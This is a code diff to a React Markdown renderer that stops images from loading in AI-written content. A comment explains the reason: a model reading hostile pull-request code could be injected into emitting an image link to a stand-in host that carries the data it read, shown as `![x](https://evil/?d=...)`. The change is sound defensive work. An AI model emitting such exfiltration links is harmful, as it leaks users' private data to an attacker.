@@ -88,8 +88,21 @@ const components: Components = {
   ),
 }
 
+/**
+ * For AI-written Markdown (analysis sections, layer summaries, line answers):
+ * an image never loads, only its alt text shows. The model reads hostile code
+ * (the PR snapshot), so an injected `![x](https://evil/?d=<what it read>)`
+ * would otherwise leak data the moment the answer renders.
+ */
+const componentsWithoutImages: Components = {
+  ...components,
+  img: ({ alt }) => (alt ? <span className="text-muted">[{alt}]</span> : null),
+}
+
 interface MarkdownProps {
   content: string
+  /** `false` for AI-written content: images show as their alt text, never load. Default `true`. */
+  images?: boolean
 }
 
 /**
@@ -98,10 +111,13 @@ interface MarkdownProps {
  * HTML crudo por defecto — importante porque los cuerpos de comentarios de
  * PRs son entrada no confiable (ver frontera de seguridad en `CLAUDE.md`).
  */
-export function Markdown({ content }: MarkdownProps): React.JSX.Element {
+export function Markdown({ content, images = true }: MarkdownProps): React.JSX.Element {
   return (
     <div className="flex flex-col gap-2">
-      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
+      <ReactMarkdown
+        remarkPlugins={[remarkGfm]}
+        components={images ? components : componentsWithoutImages}
+      >
         {content}
       </ReactMarkdown>
     </div>
